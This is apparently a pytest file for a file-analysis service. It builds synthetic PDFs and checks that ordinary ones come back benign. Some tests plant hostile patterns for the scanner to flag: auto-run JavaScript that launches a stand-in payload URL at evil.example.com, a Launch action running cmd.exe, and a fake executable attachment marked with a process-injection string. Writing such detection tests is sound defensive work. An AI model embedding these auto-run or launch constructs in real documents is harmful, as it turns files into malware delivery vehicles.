"""PDF samples through the real upload API, analysis worker, and report API."""

import asyncio
import io
import random
import zlib

import pytest
from pypdf import PdfReader, PdfWriter

from app import worker
from tests.test_api import _auth_headers, run

VISIBLE_SENTENCE = "Quarterly budget review for the finance team."


def _stream(payload: bytes, extra: bytes = b"") -> bytes:
    compressed = zlib.compress(payload)
    return b"<</Length %d/Filter/FlateDecode%s>>stream\n%s\nendstream" % (
        len(compressed), extra, compressed,
    )


def build_pdf(
    text: str = VISIBLE_SENTENCE,
    catalog_extra: bytes = b"",
    page_extra: bytes = b"",
    extra_objects: tuple[bytes, ...] = (),
) -> bytes:
    """Build an ordinary PDF: compressed text, compressed binary data, XMP metadata.

    Extra objects are numbered from 7 upward.
    """
    random.seed(7)
    embedded_font = bytes(random.randrange(256) for _ in range(120_000))
    xmp = (
        b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
        b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
        b'<rdf:Description xmlns:dc="http://purl.org/dc/elements/1.1/" '
        b'xmlns:pdf="http://ns.adobe.com/pdf/1.3/"/></rdf:RDF></x:xmpmeta>'
    )
    content = f"BT /F1 12 Tf 72 720 Td ({text}) Tj ET".encode("latin-1")
    objects = [
        b"<</Type/Catalog/Pages 2 0 R/Metadata 6 0 R" + catalog_extra + b">>",
        b"<</Type/Pages/Kids[3 0 R]/Count 1>>",
        b"<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R"
        b"/Resources<</Font<</F1 5 0 R>>>>" + page_extra + b">>",
        _stream(content),
        b"<</Type/Font/Subtype/Type1/BaseFont/Helvetica/FontFileData "
        + b"%d 0 R>>" % (7 + len(extra_objects)),
        b"<</Type/Metadata/Subtype/XML/Length %d>>stream\n%s\nendstream" % (len(xmp), xmp),
        *extra_objects,
        _stream(embedded_font),
    ]

    pdf = b"%PDF-1.7\n"
    offsets = []
    for number, body in enumerate(objects, 1):
        offsets.append(len(pdf))
        pdf += b"%d 0 obj\n%s\nendobj\n" % (number, body)
    xref_at = len(pdf)
    pdf += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objects) + 1)
    for offset in offsets:
        pdf += b"%010d 00000 n \n" % offset
    pdf += (
        b"trailer<</Size %d/Root 1 0 R/Info<</Title(Budget)/Producer(Microsoft Word)>>>>\n"
        % (len(objects) + 1)
    )
    pdf += b"startxref\n%d\n%%%%EOF\n" % xref_at
    return pdf


def analyze(isolate, data: bytes, file_name: str = "budget.pdf") -> dict:
    """Upload bytes, run the worker on the queued job, and return the report JSON."""
    captured = {}

    async def body(client):
        headers = await _auth_headers(client)
        upload = await client.post(
            "/api/v1/analyze",
            headers=headers,
            files={"file": (file_name, data, "application/pdf")},
        )
        assert upload.status_code == 202, upload.text
        await asyncio.to_thread(worker.run_analysis, isolate[-1])

        job = await client.get(f"/api/v1/analyze/{isolate[-1]}", headers=headers)
        assert job.json()["status"] == "COMPLETED", job.text

        import hashlib

        sha256 = hashlib.sha256(data).hexdigest()
        report = await client.get(f"/api/v1/report/{sha256}", headers=headers)
        assert report.status_code == 200, report.text
        captured["report"] = report.json()

    run(body)
    return captured["report"]


@pytest.fixture(autouse=True)
def isolate(monkeypatch):
    from app.api import routes

    dispatched = []
    monkeypatch.setattr("app.worker.dispatch_analysis", dispatched.append)
    monkeypatch.setattr(routes, "rate_limiter", routes.InMemoryRateLimiter())
    monkeypatch.setattr(routes.settings, "ALLOW_REGISTRATION", True)
    return dispatched


def test_ordinary_pdf_is_benign(isolate):
    report = analyze(isolate, build_pdf())

    assert report["verdict"] == "BENIGN"
    assert report["severity_score"] < 30


def test_pdf_compression_is_not_reported_as_evasion(isolate):
    report = analyze(isolate, build_pdf())

    names = report["static_data"]["behavior_profile"]["capability_names"]
    assert "defense_evasion" not in names


def test_pdf_visible_text_is_extracted(isolate):
    report = analyze(isolate, build_pdf())

    document = report["static_data"]["document"]
    assert document["type"] == "pdf"
    assert document["page_count"] == 1
    assert document["title"] == "Budget"
    assert VISIBLE_SENTENCE in document["text_preview"]


def test_pdf_binary_noise_and_metadata_are_not_indicators(isolate):
    report = analyze(isolate, build_pdf())

    assert report["iocs"]["domains"] == []
    assert report["iocs"]["urls"] == []


def test_pdf_link_annotations_and_text_urls_are_indicators(isolate):
    data = build_pdf(
        text="Contact billing@example.org or see https://docs.example.com/guide today.",
        page_extra=b"/Annots[<</Type/Annot/Subtype/Link/A<</S/URI/URI(https://www.example.net/about)>>>>]",
    )

    report = analyze(isolate, data)

    assert "https://www.example.net/about" in report["iocs"]["urls"]
    assert "https://docs.example.com/guide" in report["iocs"]["urls"]
    assert "billing@example.org" in report["iocs"]["emails"]
    assert report["verdict"] == "BENIGN"


def test_pdf_prose_about_security_is_not_behavior(isolate):
    data = build_pdf(text="Reset your password, send the secret token, connect to the service at startup.")

    report = analyze(isolate, data)

    assert report["static_data"]["behavior_profile"]["capability_names"] == []
    assert report["verdict"] == "BENIGN"


def test_pdf_opening_at_a_page_is_not_active_content(isolate):
    report = analyze(isolate, build_pdf(catalog_extra=b"/OpenAction[3 0 R/Fit]"))

    assert report["static_data"]["document"]["active_content"] == []
    assert report["verdict"] == "BENIGN"


def test_pdf_auto_run_javascript_is_suspicious(isolate):
    script = _stream(b"app.launchURL('https://evil.example.com/payload');")
    data = build_pdf(
        catalog_extra=b"/OpenAction<</S/JavaScript/JS 7 0 R>>",
        extra_objects=(script,),
    )

    report = analyze(isolate, data)

    active = report["static_data"]["document"]["active_content"]
    assert "JavaScript" in active
    assert "OpenAction" in active
    assert report["verdict"] == "SUSPICIOUS"
    assert "https://evil.example.com/payload" in report["iocs"]["urls"]


def test_pdf_launch_action_is_suspicious(isolate):
    data = build_pdf(catalog_extra=b"/OpenAction<</S/Launch/F(cmd.exe)>>")

    report = analyze(isolate, data)

    assert "Launch" in report["static_data"]["document"]["active_content"]
    assert report["verdict"] == "SUSPICIOUS"


def _with_attachment(name: str, payload: bytes) -> bytes:
    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(build_pdf())))
    writer.add_attachment(name, payload)
    output = io.BytesIO()
    writer.write(output)
    return output.getvalue()


def test_pdf_embedded_executable_is_suspicious(isolate):
    data = _with_attachment("invoice.exe", b"MZ" + b"\x00" * 200 + b"CreateRemoteThread\x00")

    report = analyze(isolate, data)

    attachments = report["static_data"]["document"]["attachments"]
    assert attachments[0]["name"] == "invoice.exe"
    assert attachments[0]["executable"] is True
    assert report["verdict"] == "SUSPICIOUS"
    assert "process_injection" in report["static_data"]["behavior_profile"]["capability_names"]


def test_pdf_requiring_a_password_is_flagged_as_uninspectable(isolate):
    writer = PdfWriter(clone_from=PdfReader(io.BytesIO(build_pdf())))
    writer.encrypt("hunter2-document-password")
    output = io.BytesIO()
    writer.write(output)

    report = analyze(isolate, output.getvalue())

    document = report["static_data"]["document"]
    assert document["encrypted"] is True
    assert document["text_preview"] == ""
    assert report["iocs"]["domains"] == []
    assert report["verdict"] == "SUSPICIOUS"


def test_unparseable_pdf_falls_back_to_raw_string_scan(isolate):
    data = b"%PDF-1.7\nnot really a pdf http://fallback.example.com/x \x00\x01\x02"

    report = analyze(isolate, data)

    assert report["static_data"]["document"]["parse_warning"]
    assert "http://fallback.example.com/x" in report["iocs"]["urls"]


def test_report_includes_file_name_and_plain_summary(isolate):
    report = analyze(isolate, build_pdf())

    assert report["file_name"] == "budget.pdf"
    summary = report["static_data"]["summary"]
    assert summary
    assert "*" not in summary
    assert "#" not in summary
    assert "1 page" in summary


def test_non_pdf_analysis_has_no_document_section(isolate):
    report = analyze(isolate, b"plain text with http://example.com/a inside", "notes.txt")

    assert report["static_data"].get("document") is None
    assert "http://example.com/a" in report["iocs"]["urls"]
    assert report["static_data"]["summary"]
